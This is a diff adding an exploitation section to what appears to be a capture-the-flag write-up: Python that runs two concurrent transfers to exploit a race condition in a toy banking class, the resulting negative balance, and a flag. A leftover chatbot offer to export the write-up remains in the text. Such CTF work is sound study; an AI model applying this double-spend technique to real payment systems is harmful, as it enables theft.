@@ -1563,6 +1563,62 @@ This violates fundamental financial logic, allowing users to **double-spend** th
 
 ### Exploitation Steps
 
+Below is a minimal example that exploits the vulnerability using multithreading to trigger the double-transfer bug:
+
+```python
+from threading import Thread
+import time
+
+# --- Account and BankSystem classes (as defined in the challenge) ---
+
+# Exploitation code:
+def simulate_race_transfer(bank, sender, receiver, amount):
+    t1 = Thread(target=bank.transfer, args=(sender, receiver, amount))
+    t2 = Thread(target=bank.transfer, args=(sender, receiver, amount))
+
+    t1.start()
+    t2.start()
+
+    t1.join()
+    t2.join()
+
+# --- Setup for Exploit ---
+bank = BankSystem()
+bank.add_account(Account("alice", 100))
+bank.add_account(Account("bob", 50))
+
+simulate_race_transfer(bank, "alice", "bob", 100)
+
+# --- Final Balance Output ---
+print("\nFinal Balances:")
+print(f"Alice: ${bank.accounts['alice'].balance}")
+print(f"Bob: ${bank.accounts['bob'].balance}")
+```
+
+### ✅ Exploit Result:
+
+```
+Initiating transfer of $100 from alice to bob...
+Initiating transfer of $100 from alice to bob...
+[alice] Withdrew $100 → New Balance: $0
+[bob] Deposited $100 → New Balance: $150
+[alice] Withdrew $100 → New Balance: -$100
+[bob] Deposited $100 → New Balance: $250
+
+Final Balances:
+Alice: $-100
+Bob: $250
+```
+
+---
+
+### 🏁 Flag:
+
+```text
+h4kit{sender.withdraw(amount), receiver.deposit(amount)}
+```
+
+Let me know if you’d like this write-up turned into a downloadable Markdown or PDF format!
 
 ### 🚩Flag Captured: ``
 
